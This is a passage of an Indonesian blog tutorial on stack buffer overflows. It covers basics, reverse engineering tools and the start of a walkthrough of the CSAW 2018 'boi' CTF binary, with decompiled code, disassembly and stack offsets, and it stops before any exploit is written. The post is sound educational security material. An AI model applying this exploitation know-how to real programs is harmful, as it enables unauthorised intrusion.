@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    /* OGP (https://ogp.me/) */
+    <meta property="og:site_name" content="f4r4w4y"/>
+    <meta property="og:description" content="Software engineering is amazing and kind of amusing for me as we can break software better if we know how to develop it, and at the same time we can develop it better if we know how to break it :D"/>
+    <meta property="og:title" content="pwning journey 0x1 stack buffer overflow"/>
+    <meta property="og:type" content="blog"/>
+    <meta property="og:url" content="https://fakhrip.github.io/blogs/pwning-journey-0x1-stack-buffer-overflow.html" />
+    <meta property="og:image" content="https://media.discordapp.net/attachments/670439298058813442/807173134200864768/characterssss.png" />
+
+    <link href="https://fonts.googleapis.com/css?family=Fira+Code|Press+Start+2P|Bitter:wght@700&&family=Raleway&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/tag.css">
+    <link rel="stylesheet" href="/base.css">
+    <link rel="stylesheet" href="/native.css">
+    <link rel="apple-touch-icon" href="../favicon/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="512x512"  href="../favicon/android-chrome-512x512.png">
+    <link rel="icon" type="image/png" sizes="192x192"  href="../favicon/android-chrome-192x192.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="../favicon/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="../favicon/favicon-16x16.png">
+    <link rel="manifest" href="../favicon/site.webmanifest">
+
+    <title>f4r4w4y</title>
+</head>
+<body>
+
+    <div class="fullscreen-bg">
+        <img src="/pictures/bg1.jpg" alt="full-bg">
+    </div>
+
+    <div class="small-left-top-term">
+        <div class="container">
+            <h3 class="fullname">Muhammad Fakhri Putra <br> Supriyadi</h3>
+
+            <h5 class="text">    
+                [fai@f4r4w4y blogs]$ <span style="font-weight: normal">tldr ./pwning-journey-0x1-stack-buffer-overflow.md</span>
+                <ul style="list-style-type: none;">
+                    <li>
+                        TL;DR <p>Software engineering is amazing and kind of amusing for me as we can break software better if we know how to develop it, and at the same time we can develop it better if we know how to break it :D</p>
+
+                    </li>
+                </ul>
+            </h5>
+        </div>
+    </div>
+
+    <div class="small-left-bottom-term">
+        <div class="container">
+            <h5 class="text">    
+                [fai@f4r4w4y blogs]$ <span style="font-weight: normal">tags ./pwning-journey-0x1-stack-buffer-overflow.md</span>
+                <ul style="list-style-type: none;">
+                    <li>
+                        <div class="tags-container">
+                            
+                            <span class="tag" id="hacking">
+                                HACKING
+                            </span>
+                            
+                            <span class="tag" id="series">
+                                SERIES
+                            </span>
+                            
+                        </div>
+                    </li>
+                </ul>
+            </h5>
+
+            <h5 class="text">    
+                [fai@f4r4w4y blogs]$ <span style="font-weight: normal">timing ./pwning-journey-0x1-stack-buffer-overflow.md</span>
+                <ul style="list-style-type: none;">
+                    <li>
+                        Estimated <p>20 mins read</p>
+
+                    </li>
+                </ul>
+            </h5>
+
+            <h5 class="text">    
+                [fai@f4r4w4y blogs]$ <span style="font-weight: normal">articlelastupdated ./pwning-journey-0x1-stack-buffer-overflow.md</span>
+                <ul style="list-style-type: none;">
+                    <li>
+                        Last updated on February 05, 2021 at 20:49:32
+                    </li>
+                </ul>
+            </h5>
+        </div>
+    </div>
+
+    <div class="full-term">
+        <div class="container text">
+            <h5 class="text">
+                [fai@f4r4w4y blogs]$ <span style="font-weight: normal">cd <a class="link underline" href="/blogs.html">..</a></span>
+            </h5>
+
+            <h5 class="text">
+                [fai@f4r4w4y blogs]$ <span style="font-weight: normal">fancyblogcat <span id="location" style="font-weight: normal"></span></span>
+            </h5>
+
+            <hr/>
+            <center>
+                <span style="font-weight: normal">بِسْمِ ٱللَّٰهِ ٱلرَّحْمَٰنِ ٱلرَّحِيمِ</span>
+            </center>
+            <hr/>
+            
+            <div class="blog-content">
+                <h1>Pwning Journey 0x1 Stack Buffer Overflow</h1>
+
+<p>Series ini saya buat untuk membagikan apa yang sudah dan sedang saya pelajari mengenai <code>binary exploitation</code>, dan terlebih dari itu juga untuk menjadi pengingat saya disaat saya lupa dengan teknik-teknik simple (bahkan syntax debugging pada <code>gef</code> :v).</p>
+
+<p>Semua hal yang saya tulis di series ini didasarkan oleh banyak sumber pelajaran yang saya dapatkan terutama dari <a target="_blank" href="https://guyinatuxedo.github.io/index.html">nightmare course by guyinatuxedo</a>.</p>
+
+<p>Bahkan karena bisa dibilang ini versi indonesia dan lebih detailnya dari nigthmare course, maka saya sarankan untuk orang yang paham bahasa inggris, sudah dapat basic nya, ingin serba cepat dan to-the-point maka langsung saja pelajari dari nightmare course yang saya sudah berikan link-nya diatas.</p>
+
+<h3>The Openings</h3>
+
+<p>Stack buffer overflow pertama kali diperkenalkan oleh Elias Levy (aka Aleph One) dengan artikel yang dia publish pada sebuah website hacker zine yang sangat terkenal yaitu phrack, dia menulis artikel berjudul "Smashing The Stack For Fun And Profit" yang bisa diakses <a target="_blank" href="http://phrack.org/issues/49/14.html">disini</a>. </p>
+
+<p>Sebenarnya semuanya yang dijelaskan disana sudah sangat jelas menurut saya akan tetapi saya tetap menulis artikel ini untuk mempermudah orang orang yang masih sangat baru dengan hal ini (terutama yang belum mahir bahasa inggris :v). </p>
+
+<p>Sebelum membaca lebih jauh, saya sangat sarankan untuk mempelajari tentang arsitektur CPU terlebih dahulu karena itu merupakan hal yang sangat penting untuk dipahami agar mempermudah pemahaman dalam pembuatan exploit, dan kebetulan sebuah CrashCourse yang dibuat oleh PBS Digital Studios sudah membuatkan video pada youtube yang membahas dengan sangat jelas bagaimana cara kerja CPU dan sebagainya yang bisa diakses <a target="_blank" href="https://www.youtube.com/watch?v=tpIctyqH29Q&amp;list=PL8dPuuaLjXtNlUrzyH5r6jN9ulIgZBpdo&amp;ab_channel=CrashCourse">disini</a>.</p>
+
+<h3>What is stack anyway ?</h3>
+
+<p><a target="_blank" href="https://en.wikipedia.org/wiki/Stack_(abstract_data_type)">Stack</a> merupakan sebuah teknik penyimpanan data pada sistem operasi dimana data yang disimpan ini akan seolah-olah berbentuk menyerupai sebuah tumpukan, atau bisa juga saya analogikan sebagai gelas yang tentunya hanya memiliki satu lubang yaitu diatasnya, dan air (dalam hal ini data) hanya bisa masuk dan keluar melalui satu lubang diatas tersebut.</p>
+
+<p>Seperti terlihat pada gambar dibawah, stack bisa mengeluarkan data yang terakhir/teratas dengan menggunakan <code>pop</code> dan bisa juga memasukkan data kedalamnya dengan menggunakan <code>push</code>, 2 hal ini menjadi suatu hal yang penting untuk dipahami karena akan menjadi landasan dalam pemahaman struktur data nya itu sendiri.</p>
+
+<p><img src="https://upload.wikimedia.org/wikipedia/commons/b/b4/Lifo_stack.png" alt="stack-picture" /> <br />
+sumber: <a target="_blank" href="https://en.wikipedia.org/wiki/Stack_(abstract_data_type)">wikipedia</a></p>
+
+<p>Dalam konteks sistem operasi, data yang disimpan pada stack merupakan sebuah <code>memory address</code> (alamat memori), yang berguna untuk menyimpan data lainnya (bisa berupa sebuah informasi yang penting dan banyak hal lainnya).</p>
+
+<h3>What about buffer ?</h3>
+
+<p>Buffer sebenarnya hanya sebuah tempat yang sudah di alokasikan sedemikian rupa sehingga bisa memuat data didalamnya entah apapun itu data yang dimuatnya, akan tetapi dikarenakan buffer ini hanya bisa dipakai setelah dialokasikan terlebih dahulu, maka ukurannya harus sesuai dengan data yang ingin dimuat kedalamnya.</p>
+
+<p>Saya akan analogikan buffer sebagai sebuah restoran yang harus di reserve/pesan dulu tempatnya sebelum kita bisa makan didalamnya, disaat kita memesan tempat untuk 5 orang maka akan hanya ada <code>≤ 5</code> orang yang bisa masuk dan makan di tempat yang sudah kita pesan, akan tetapi apabila ada <code>&gt; 5</code> (misal 6) orang yang masuk maka akan terjadi yang namanya overflow dimana orang ke-6 itu tidak jelas akan duduk dimana dan akan membuat pusing satu restoran XD.</p>
+
+<p><img src="https://media.giphy.com/media/ukqBV7WM4BQ4w/giphy.gif" alt="madness" /></p>
+
+<p>Dalam konteks sistem operasi, disaat terjadi overflow pada buffer maka data yang overflow itu akan menimpa data yang berada setelahnya yang akan membuat kacau aliran eksekusi pada sebuah program.</p>
+
+<p>Dengan menggunakan kesalahan programmer saat menulis kode program, kita bisa meng-exploit kesalahan tersebut dengan cara mengambil keuntungan dari celah buffer overflow ini, bila kalian pembaca yang kreatif seharusnya akan langsung kepikiran sebuah fakta bahwa saat data yang overflow itu menimpa data yang setelahnya maka dalam artian lain kita bisa merubah beberapa bagian dari kode yang telah ditulis oleh programmer sebelumnya yang dalam artian lain kita memiliki kuasa/kontrol terhadap cara kerja atau aliran eksekusi pada beberapa bagian dari sebuah program, mari kita sebut ini dengan <code>Control Flow Attack</code>. </p>
+
+<h3>Preliminaries</h3>
+
+<p>Sebelum kita bisa membuat exploit untuk mengambil keuntungan dari celah yang ada pada sebuah program maka kita harus mengetahui terlebih dahulu bagaimana cara kerja sebuah program tersebut, dan untuk mengetahui cara kerja sebuah program kita harus mengetahui cara kerja sebuah CPU dalam menjalankan program tersebut (itulah kenapa pemahaman tentang arsitektur CPU penting).</p>
+
+<p>Diluar pemahaman tentang CPU, kita harus mengetahui cara kerja sebuah program dan untuk itulah ada yang namanya <a target="_blank" href="https://yohan.es/reverse-engineering/">reverse engineering</a>, di artikel yang saya link itu sudah menjelaskan dengan sangat detail dan juga saya tidak akan membahas terlalu dalam tentang reverse engineering itu sendiri (karena saya juga masih noob XD), akan tetapi disini saya akan jelaskan sedikit mengenai bagaimana caranya dan apa saja yang diperlukan untuk memahaminya.</p>
+
+<h3>Reverse engineering</h3>
+
+<p>Reverse engineering merupakan sebuah proses dimana kita membongkar sebuah program untuk mengetahui bagaimana cara kerjanya (karena kita tidak memiliki source code dari program yang bersangkutan).</p>
+
+<p>Untuk bisa memahami ini kita harus sebelumnya memahami tentang <a target="_blank" href="https://yohan.es/reverse-engineering/bab5/">bahasa assembly</a> dan cara CPU menjalankannya, saya akan analogikan ini sebagai sebuah daftar aktifitas yang harus dilakukan oleh seorang murid di sekolah.</p>
+
+<p>Mari kita anggap berikut ini adalah daftar aktifitasnya :</p>
+
+<div class="codehilite"><pre><span></span><code><span class="k">1.</span> Belajar matematika
+<span class="k">2.</span> Belajar bahasa indonesia
+<span class="k">3.</span> Istirahat
+<span class="k">4.</span> Belajar bahasa inggris
+<span class="k">5.</span> Ujian fisika
+</code></pre></div>
+
+<p>Maka seorang murid akan melakukan aktifitas diatas itu dengan berurutan dari 1-5 hingga akhirnya selesai melakukan seluruh aktifitasnya, sama hal nya dengan CPU, dia akan menjalankan seluruh hal yang ada pada program secara berurutan dari instruksi paling pertama contohnya:</p>
+
+<div class="codehilite"><pre><span></span><code><span class="mh">0x110</span> <span class="n">push</span> <span class="n">rbp</span>
+<span class="mh">0x111</span> <span class="n">mov</span> <span class="n">rbp</span><span class="p">,</span><span class="n">rsp</span>
+<span class="mh">0x114</span> <span class="n">mov</span> <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0xc</span><span class="p">],</span><span class="mh">0x1</span>
+<span class="mh">0x11b</span> <span class="n">mov</span> <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x8</span><span class="p">],</span><span class="mh">0x2</span>
+</code></pre></div>
+
+<p>Maka CPU akan menjalankan seluruh instruksi diatas dari alamat <code>0x110 - 0x11b</code>, alamat <code>0x110 - 0x11b</code> merupakan sebuah alamat yang berada dalam sebuah <a target="_blank" href="http://www.cs.uwm.edu/classes/cs315/Bacon/Lecture/HTML/ch10s07.html">stack frame</a>.</p>
+
+<p>Syntax assembly seperti contoh diatas merupakan syntax Intel dimana ada syntax lainnya yaitu AT&amp;T yang memiliki beberapa perbedaan termasuk penempatan argumen nya.</p>
+
+<p>Untuk lebih dalam tentang assembly saya berikan beberapa referensi yang bisa dipakai untuk penjelasan yang jauh lebih mendetail nya :</p>
+
+<ul>
+<li><a target="_blank" href="http://www.cs.virginia.edu/~evans/cs216/guides/x86.html">x86 assembly guide from University of Virginia Computer Science</a>  </li>
+<li><a target="_blank" href="https://www.youtube.com/watch?v=75gBFiFtAb8">x86 assembly crash course video from HackUCF</a>  </li>
+<li><a target="_blank" href="https://www.youtube.com/watch?v=H4Z0S9ZbC0g&amp;list=PL038BE01D3BAEFDB0&amp;ab_channel=OpenSecurityTraining">x86 detailed video playlist from Open Security Training</a>  </li>
+</ul>
+
+<p>Dan karena contoh yang saya berikan diatas merupakan assembly untuk arsitektur x64 bisa dilihat dengan penamaan register menggunakan huruf awal <code>r</code> seperti <code>rbp, rsp, rax, dll</code>, berikut ada juga referensi yang bisa digunakan untuk memahami lebih dalam untuk arsitektur x64 :</p>
+
+<ul>
+<li><a target="_blank" href="https://www.youtube.com/watch?v=rxsBghsrvpI&amp;list=PLKK11Ligqitg9MOX3-0tFT1Rmh3uJp7kA&amp;ab_channel=Creel">Modern x64 Assembly video playlist from Creel</a>  </li>
+</ul>
+
+<p>Dari pemahaman assembly itulah kita bisa memahami alur eksekusi sebuah program yang telah dicompile dengan cara men-disassembly, disassembly merupakan sebuah proses dimana kita melihat bentukan assembly dari sebuah program yang telah di compile sebelumnya, seperti artinya <code>disassembly == membongkar</code>.</p>
+
+<p>Contoh nya seperti berikut saya memiliki sebuah program bahasa C bernama <code>testing.c</code> :</p>
+
+<div class="codehilite"><pre><span></span><code><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kt">int</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">;</span>
+    <span class="n">a</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="n">b</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
+    <span class="n">c</span> <span class="o">=</span> <span class="n">a</span> <span class="o">+</span> <span class="n">b</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>Dan bisa kita compile program nya dengan menggunakan command <code>gcc -O0 testing.c -o testing</code>, argumen <code>-O0</code> pada gcc mengartikan bahwa kompilasi program dilakukan tanpa adanya optimisasi apapun, dan seperti yang bisa dilihat dengan menggunakan argumen <code>-o</code> kita bisa menentukan output atau file untuk hasil dari kompilasinya.</p>
+
+<p>Setelah itu kita bisa melihat assembly nya dengan cara men-disassemble program yang telah di kompilasi tadi yaitu file bernama <code>testing</code> tanpa ekstensi apapun, kita akan disassemble dengan menggunakan objdump dengan command berikut.</p>
+
+<div class="codehilite"><pre><span></span><code>╭─f4r4w4y@blackrock ~/Documents/random 
+╰─$ objdump -D -Mintel testing <span class="p">|</span> grep main -A15 <span class="p">|</span> tail -16
+<span class="m">0000000000001129</span> &lt;main&gt;:
+    <span class="m">1129</span>:   f3 0f 1e fa             endbr64 
+    112d:   <span class="m">55</span>                      push   rbp
+    112e:   <span class="m">48</span> <span class="m">89</span> e5                mov    rbp,rsp
+    <span class="m">1131</span>:   c7 <span class="m">45</span> f4 <span class="m">01</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>    mov    DWORD PTR <span class="o">[</span>rbp-0xc<span class="o">]</span>,0x1
+    <span class="m">1138</span>:   c7 <span class="m">45</span> f8 <span class="m">02</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>    mov    DWORD PTR <span class="o">[</span>rbp-0x8<span class="o">]</span>,0x2
+    113f:   8b <span class="m">55</span> f4                mov    edx,DWORD PTR <span class="o">[</span>rbp-0xc<span class="o">]</span>
+    <span class="m">1142</span>:   8b <span class="m">45</span> f8                mov    eax,DWORD PTR <span class="o">[</span>rbp-0x8<span class="o">]</span>
+    <span class="m">1145</span>:   <span class="m">01</span> d0                   add    eax,edx
+    <span class="m">1147</span>:   <span class="m">89</span> <span class="m">45</span> <span class="nb">fc</span>                mov    DWORD PTR <span class="o">[</span>rbp-0x4<span class="o">]</span>,eax
+    114a:   b8 <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>          mov    eax,0x0
+    114f:   5d                      pop    rbp
+    <span class="m">1150</span>:   c3                      ret    
+    <span class="m">1151</span>:   <span class="m">66</span> 2e 0f 1f <span class="m">84</span> <span class="m">00</span> <span class="m">00</span>    nop    WORD PTR cs:<span class="o">[</span>rax+rax*1+0x0<span class="o">]</span>
+    <span class="m">1158</span>:   <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> 
+    115b:   0f 1f <span class="m">44</span> <span class="m">00</span> <span class="m">00</span>          nop    DWORD PTR <span class="o">[</span>rax+rax*1+0x0<span class="o">]</span>
+</code></pre></div>
+
+<p>Argumen <code>-D</code> mengartikan bahwa kita ingin melakukan disassembly, dan argumen <code>-Mintel</code> mengartikan bahwa kita ingin menggunakan syntax Intel, command lainnya seperti <code>grep</code> dan <code>tail</code> hanya digunakan untuk langsung memfokuskan output pada fungsi <code>main</code> dari program yang telah dibuat.</p>
+
+<p>Nah, karena reverse engineering merupakan proses dimana kita membongkar tanpa mengetahui source code nya, maka dalam artian lain kita harus bisa merekonstruksi ulang program <code>testing</code> atau mengetahui alur eksekusi nya, tanpa awalnya mengetahui source code nya yaitu <code>testing.c</code>.</p>
+
+<p>Artikel nya akan sangat panjang bila saya jelaskan lebih dalam tentang reverse engineering dan juga sudah lewat dari pembahasan utama yaitu <code>stack buffer overflow</code>, jadi saya berikan saja referensi yang menurut saya sangat bagus untuk memahami nya (mungkin akan bias, karena saya gunakan Cutter jadi disini saya kasih referensi yang menggunakan Cutter juga) :</p>
+
+<ul>
+<li><a target="_blank" href="https://www.jamieweb.net/blog/radare2-cutter-part-1-key-terminology-and-overview/">Reverse Engineering menggunakan Cutter from jamieweb.net</a></li>
+</ul>
+
+<h3>Tooling</h3>
+
+<p>Sebelum membahas tentang exploitasi, saya akan membahas tentang apa saja tools yang bisa digunakan untuk mempermudah exploitasi dan juga merupakan tools standar yang sering digunakan oleh kebanyakan exploit developer.</p>
+
+<ul>
+<li><p><a target="_blank" href="https://gef.readthedocs.io/en/master/">GEF - GDB Enhanced Features</a>  </p>
+
+<p>Tools ini merupakan sebuah addon untuk GDB yang digunakan sebagai debugger yang tentunya fungsinya untuk men-debug sebuah program, yang salah satunya berguna untuk mengetahui alur eksekusi sebuah program.</p></li>
+<li><p><a target="_blank" href="https://ghidra-sre.org/">Ghidra</a> / <a target="_blank" href="https://www.hex-rays.com/products/ida/support/download_freeware/">IDA</a> / <a target="_blank" href="https://cutter.re/">Cutter</a>  </p>
+
+<p>Tools ini berguna untuk reverse engineer (disassembler, decompiler, dll).</p>
+
+<p>Saya menggunakan Cutter pada artikel yang saya buat ini.</p></li>
+<li><p><a target="_blank" href="https://github.com/Gallopsled/pwntools">Pwntools</a></p>
+
+<p>Tools ini berguna untuk memudahkan hal-hal yang ingin dilakukan untuk exploitasi atau yang biasa disebut dengan pwning (itulah kenapa namanya pwntools :v), dan juga sebenarnya ini merupakan library untuk python.</p></li>
+<li><p><a target="_blank" href="https://www.python.org/downloads/">Python</a></p>
+
+<p>Karena saya akan menggunakan Python jadi saya masukkan python kedalam list tools yang digunakan, akan tetapi pada dasarnya bahasa apapun bisa digunakan untuk exploit development (termasuk PHP, walaupun memang aneh tapi nyata :v).</p></li>
+</ul>
+
+<h3>Binary Exploitation</h3>
+
+<p>Karena sudah terlalu banyak pendahuluan-pendahuluan, maka sekarang langsung saja kita masuk kedalam proses exploitasi nya dari mulai pencarian celah hingga pembuatan exploit nya.</p>
+
+<p>Dan karena seperti yang sudah saya bilang saya akan mengikuti challenges yang ada pada nightmare course, karena itu resource utama saya belajar tentang hal ini.</p>
+
+<p>Tidak semua challenges nya akan saya tulis disini solusi nya karena sangat memakan waktu dan tenaga XD, jadi saya ambil beberapa challenges yang sudah bisa merekap seluruh bagian untuk <code>stack buffer overflow</code> pada nightmare course, walaupun demikian seluruh solution dan binary nya ada di <a target="_blank" href="https://github.com/fakhrip/LearningJourney_v1/tree/master/Security/Binary%20Exploitation/stack-buffer-overflows">Repository LearningJourney_V1 saya</a> (solusi nya mirip seperti nightmare course dan ada juga yang sama) bilapun beda biasanya hanya terletak pada syntax nya karena saya sekalian meng-explore fitur-fitur yang ada pada pwntools.</p>
+
+<h3>Csaw 2018 Quals Boi</h3>
+
+<p>Kita diberikan sebuah program bernama <code>boi</code> yang bila dijalankan akan meminta sebuah inputan dan langsung dilanjutkan dengan output berupa datetime saat dijalankan, seperti berikut :</p>
+
+<pre><code>╭─f4r4w4y@blackrock stack-buffer-overflows/csaw-boi
+╰─$ ./boi
+Are you a big boiiiii??
+asd
+Jum 05 Feb 2021 04:23:54  WIB
+</code></pre>
+
+<p>Dan bila kita jalankan command file maka akan mendapatkan output seperti berikut :</p>
+
+<pre><code>╭─f4r4w4y@blackrock stack-buffer-overflows/csaw-boi 
+╰─$ file boi 
+boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=1537584f3b2381e1b575a67cba5fbb87878f9711, not stripped
+</code></pre>
+
+<p>Itu mengartikan bahwa file nya merupakan program dengan arsitektur x64 (64 bit), dan juga terdapat tulisan <code>not stripped</code> yang saya akan bahas nanti lagi untuk lebih detailnya.</p>
+
+<p>Selanjutnya kita akan melihat proteksi apa saja yang dimiliki oleh program yang telah dibuat, dan hal ini bisa dilakukan dengan menggunakan command <code>checksec</code> apabila pwntools telah diinstall didalam mesin yang digunakan, seperti berikut :</p>
+
+<pre><code>╭─f4r4w4y@blackrock stack-buffer-overflows/csaw-boi 
+╰─$ checksec boi 
+[*] '/home/f4r4w4y/Documents/general/LearningJourney_v1/Security/Binary Exploitation/stack-buffer-overflows/csaw-boi/boi'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</code></pre>
+
+<p>Sebenarnya untuk challenge ini masih tidak perlu memperhatikan proteksi pada program yang diberikan, akan tetapi ini merupakan prosedur standar untuk mengetahui lebih dahulu jika memang nantinya kita harus bypass proteksi yang ada pada program yang diberikan.</p>
+
+<p>Dan untuk mengenai penjelasan tentang proteksinya akan saya jelaskan di challenge selanjutnya saat sudah berguna.</p>
+
+<p>Untuk itu langkah selanjutnya mari kita lihat pada Cutter dan coba melakukan reverse engineering untuk mengetahui program yang dibuat.</p>
+
+<p>Dari hasil decompile nya kita bisa dapatkan rekonstruksi program seperti berikut :</p>
+
+<div class="codehilite"><pre><span></span><code><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="n">undefined8</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">undefined8</span> <span class="n">uVar1</span><span class="p">;</span>
+    <span class="kt">int64_t</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="o">**</span><span class="n">var_40h</span><span class="p">;</span>
+    <span class="kt">int64_t</span> <span class="n">var_34h</span><span class="p">;</span>
+    <span class="kt">int64_t</span> <span class="n">var_28h</span><span class="p">;</span>
+    <span class="kt">int64_t</span> <span class="n">var_20h</span><span class="p">;</span>
+    <span class="kt">int64_t</span> <span class="n">var_18h</span><span class="p">;</span>
+    <span class="kt">int64_t</span> <span class="n">canary</span><span class="p">;</span>
+
+    <span class="n">canary</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">int64_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
+    <span class="n">stack0xffffffffffffffc8</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">var_28h</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">var_18h</span><span class="p">.</span><span class="n">_0_4_</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">var_20h</span> <span class="o">=</span> <span class="o">-</span><span class="mh">0x2152411100000000</span><span class="p">;</span>
+    <span class="n">var_34h</span><span class="p">.</span><span class="n">_0_4_</span> <span class="o">=</span> <span class="p">(</span><span class="n">undefined4</span><span class="p">)</span><span class="n">argc</span><span class="p">;</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Are you a big boiiiii??&quot;</span><span class="p">);</span>
+    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="kt">int64_t</span><span class="p">)</span><span class="o">&amp;</span><span class="n">var_34h</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">var_20h</span><span class="p">.</span><span class="n">_4_4_</span> <span class="o">==</span> <span class="o">-</span><span class="mh">0x350c4512</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">run_cmd</span><span class="p">(</span><span class="s">&quot;/bin/bash&quot;</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="n">run_cmd</span><span class="p">(</span><span class="s">&quot;/bin/date&quot;</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="n">uVar1</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">canary</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">int64_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
+        <span class="n">uVar1</span> <span class="o">=</span> <span class="n">__stack_chk_fail</span><span class="p">();</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="n">uVar1</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>Perlu diingat bahwa tidak selamanya hasil rekonstruksi dari dekompilasi sebuah program itu bisa berjalan dengan baik dan menghasilkan rekonstruksi program yang akurat, bahkan sering kali kita tidak bisa mempercayai hasil decompilation maka dari itu akan sangat baik jika melihat kembali pada hasil disassembly nya dan mencocokkan dengan hasil rekonstruksi untuk memverifikasinya.</p>
+
+<p>Dalam hal ini hasil rekonstruksinya sudah akurat dan tidak perlu lagi lihat bahasa assembly hasil dari dissassembly nya, dan jika kita lihat dari hasil rekonstruksi, program mengoutputkan <code>Are you a big boiiiii??</code> dengan menggunakan <code>puts()</code> dan selanjutnya meminta inputan sebesar <code>0x18</code> bytes dengan menggunakan <code>read()</code> kedalam variable <code>var_34h</code>.</p>
+
+<p>Lalu yang terpenting adalah kita bisa lihat bahwa disana ada perbandingan nilai antara variable <code>var_20h</code> dengan nilai <code>-0x350c4512</code>, yang bila kita lihat pada hasil disassemble nya dia membandingkan dengan nilai <code>0xcaf3baee</code>, seperti berikut : </p>
+
+<pre><code>0x004006a5      mov     eax, dword [var_1ch]
+0x004006a8      cmp     eax, 0xcaf3baee
+0x004006ad      jne     0x4006bb
+0x004006af      mov     edi, str.bin_bash ; 0x40077c ; char *arg1
+0x004006b4      call    run_cmd    ; sym.run_cmd
+0x004006b9      jmp     0x4006c5
+0x004006bb      mov     edi, str.bin_date ; 0x400786 ; char *arg1
+0x004006c0      call    run_cmd    ; sym.run_cmd
+</code></pre>
+
+<p>Dan juga bisa dilihat bila nilai dari variable <code>var_20h</code> ternyata sama dengan nilai <code>0xcaf3baee</code>, maka dia akan menjalankan sebuah bash shell yang dengan inilah kita bisa mendapatkan flag yang kita inginkan.</p>
+
+<blockquote>
+  <p>Oh ya, karena ini didasarkan dari challenge pada capture the flag maka tujuan akhirnya adalah mendapatkan flag yang berupa sebuah string yang tersimpan pada sebuah server dan kita harus mendapatkan flag itu dengan cara <code>hack the system/program</code>, maka dari itu kita akan membuat flag di mesin lokal kita dan seolah olah kita tidak bisa membaca flag nya kecuali dengan cara mengeksploitasi program yang diberikan.</p>
+  
+  <p>Mari kita buat flag berupa "flag{pwned}" dengan command <code>echo "flag{pwned}" &gt; flag.txt</code>.</p>
+</blockquote>
+
+<p>Balik lagi ke program, bisa dilihat bahwa value dari variable <code>var_20h</code> tidak pernah dirubah dalam program, maka kita harus bisa mengeksploitasi programnya saat runtime atau saat dijalankan agar bisa merubah value dari variable tersebut.</p>
+
+<p>Value awal dari variable <code>var_20h</code> adalah <code>0xdeadbeef</code>, hal ini juga bisa dilihat pada hasil disassembly nya, seperti berikut :</p>
+
+<pre><code>0x0040067e      mov     dword [var_1ch], 0xdeadbeef
+</code></pre>
+
+<p>Bila kita perhatikan hasil rekonstruksi programnya dengan seksama, maka ternyata terjadi <code>stack buffer overflow</code> disaat mengambil inputan menggunakan <code>read()</code>, dikarenakan inputan yang akan diambil yaitu sebesar <code>0x18</code> bytes sementara variable <code>var_34h</code> berada pada offset <code>0x34</code> bytes sedangkan variable <code>var_20h</code> berada pada offset <code>0x20</code> bytes, ini bisa dilihat dari stack frame yang berada pada paling atas fungsi main di disassembler pada Cutter nya, seperti berikut :</p>
+
+<pre><code>159: int main (int argc, char **argv);
+; var char **var_40h @ rbp-0x40
+; var int64_t var_34h @ rbp-0x34
+; var void *buf @ rbp-0x30
+; var int64_t var_28h @ rbp-0x28
+; var int64_t var_20h @ rbp-0x20
+; var int64_t var_1ch @ rbp-0x1c
+; var int64_t var_18h @ rbp-0x18
+; var int64_t canary @ rbp-0x8
+; arg int argc @ rdi
+; arg char **argv @ rsi
+</code></pre>
+
